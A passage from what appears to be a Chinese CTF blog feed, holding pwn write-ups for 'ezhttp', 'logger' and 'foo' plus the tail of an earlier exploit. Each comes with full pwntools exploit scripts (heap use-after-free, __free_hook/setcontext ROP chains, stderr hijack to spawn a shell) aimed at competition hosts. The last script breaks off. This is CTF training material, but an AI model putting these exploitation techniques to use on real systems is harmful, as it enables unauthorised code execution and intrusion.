*0x400D1A')</span></span><br><span class="line">p.send(payload)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">p.send(p64(pop_rdi)+p64(libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h3><p>套了web的堆题，存在uaf漏洞。</p><p>结合unsortbin进行io_leak，接着修改<code>__free_hook</code>为<code>setcontext</code>，利用<code>sys_rt_sigprocmask</code>系统调用劫持程序流程，从而进行orw读取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1/16</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ezhttp"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc-2.27.so'</span>&#125;)</span><br><span class="line">p = remote(<span class="string">"183.129.189.61"</span>,<span class="number">53102</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"======= Send Http packet to me: ========"</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /create /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\ncontent='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"======= Send Http packet to me: ========"</span>)</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">POST /del /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"======= Send Http packet to me: ========"</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /edit /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''&amp;content='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(data)</span>:</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /create /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\ncontent='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(idx)</span>:</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">POST /del /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'''</span></span><br><span class="line"><span class="string">POST /edit /</span></span><br><span class="line"><span class="string">Cookie: user=admin</span></span><br><span class="line"><span class="string">token: \x0d</span></span><br><span class="line"><span class="string">\r\n\r\nindex='''</span>+str(idx)+<span class="string">'''&amp;content='''</span>+data+<span class="string">'''</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">libc.address = <span class="number">0x00007ffff79e2000</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xf0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your gift: 0x"</span>)</span><br><span class="line">heap = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x12</span>)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__malloc_hook'</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'setcontext'</span>])</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(p64(heap<span class="number">-0x10</span>)[:<span class="number">6</span>])</span><br><span class="line">add(p64(heap<span class="number">-0x10</span>)[:<span class="number">6</span>])</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'\x80\xe7'</span>)</span><br><span class="line"><span class="comment">#add(p64(heap)[:6])</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(p64(heap)[:<span class="number">6</span>])</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'\xe3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'\x60\xe7'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(p64(heap)[:<span class="number">6</span>])</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="string">'\x00'</span>)</span><br><span class="line">add(p64(<span class="number">0xfbad1801</span>)[:<span class="number">6</span>])</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1801</span>))</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>))<span class="number">-0x3EC7E3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc.sym[<span class="string">'__free_hook'</span>])[:<span class="number">6</span>])</span><br><span class="line">add(p64(<span class="number">0</span>)[:<span class="number">6</span>])</span><br><span class="line">add(p64(libc.sym[<span class="string">'setcontext'</span>])[:<span class="number">6</span>])</span><br><span class="line">pop_rax = <span class="number">0x0000000000043a78</span> +libc.address</span><br><span class="line">pop_rdi = <span class="number">0x000000000002155f</span> +libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000023e8a</span> +libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b96</span> +libc.address</span><br><span class="line">pop_rsi_rbp = <span class="number">0x000000000007dd9e</span> +libc.address</span><br><span class="line">syscall = <span class="number">0x00000000000013c0</span> +libc.address</span><br><span class="line">syscall = <span class="number">0x11B957</span> +libc.address</span><br><span class="line">payload = <span class="string">'./flag'</span>.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap+<span class="number">0x120</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(pop_rsi_rbp)</span><br><span class="line">payload += p64(heap+<span class="number">0x130</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(pop_rdi+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"><span class="keyword">print</span> hex(len(payload))</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;mmutag&quot;&gt;&lt;a href=&quot;#mmutag&quot; class=&quot;headerlink&quot; title=&quot;mmutag&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020年全国工业互联网安全技术技能大赛线上初赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/10/25/a0d88c21/"/>
    <id>https://nuoye-blog.github.io/2020/10/25/a0d88c21/</id>
    <published>2020-10-25T14:00:00.000Z</published>
    <updated>2020-10-25T13:58:02.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>第一次输入Warning时栈上有残留信息，以此leak出libc地址。</p><p>Warning_once会对0x67f7b0+idx处地址写入一个值（该值为输入data的长度），并且idx未检查，可以输入负数溢出。</p><p>通过劫持stderr到bss上，布置好函数表，退出时会用到stderr，用system调用shell即可。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./logger")</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"39.105.35.195"</span>,<span class="string">"12432"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"logger"</span>).libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Warning1</span><span class="params">(data)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Warning_once1</span><span class="params">(data,idx)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ID:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error1</span><span class="params">(data)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">Warning1(<span class="string">"a"</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3A2A9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base +libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#IO</span></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(one_gadget&amp;<span class="number">0xff</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>),<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>),<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span>),<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span>),<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Warning_once1("1"*((one_gadget&gt;&gt;48)&amp;0xff),6)</span></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(ord(<span class="string">'s'</span>)),<span class="number">0x10</span>+<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(ord(<span class="string">'h'</span>)),<span class="number">0x10</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xc0</span>),<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xF7</span>),<span class="number">-0x10</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x67</span>),<span class="number">-0x10</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">-0x10</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">-0x10</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">-0x10</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xb0</span><span class="number">-8</span>),<span class="number">0x98</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xF7</span>),<span class="number">0x98</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x67</span>),<span class="number">0x98</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0x98</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0x98</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0x98</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xb0</span><span class="number">-0x38</span>),<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xF8</span>),<span class="number">0xe8</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x67</span>),<span class="number">0xe8</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0xe8</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0xe8</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0xe8</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(one_gadget&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b fprintf\n b system\n b *0x406860')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="foo"><a href="#foo" class="headerlink" title="foo"></a>foo</h3><p>用seccomp初始化沙盒，所以堆上会残留信息，以此来leak出libc地址。</p><p>接着逐位爆破cookie。</p><p>然后利用malloc_consolidate机制，将0x40的堆块合并到topchunk中，再进行guess申请到该地址，并将0x28偏移处改为cookie，即可构成double free。</p><p>继续操作将该堆块合并进top chunk中，接着再依次进行申请堆块以及guess即可写fd，通过此操作劫持<code>__free_hook</code>。</p><p>将<code>__free_hook</code>修改为printf即可用格式化字符串来进行leak操作。</p><p>操作完毕后0x190的tcache中会存在两个相邻的0x40的堆块，通过guess溢出第二个堆块到第一个堆块的fd，将其修改为页对齐的地址。接着申请到该地址到idx为7处，并修改<code>__free_hook</code>为mprotect。接着free(7)，即会将该地址设置为可读写操作。</p><p>最后将<code>__free_hook</code>为下一申请到的0x190的堆块地址，并用guess在此堆块上写入shellcode进行orw。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 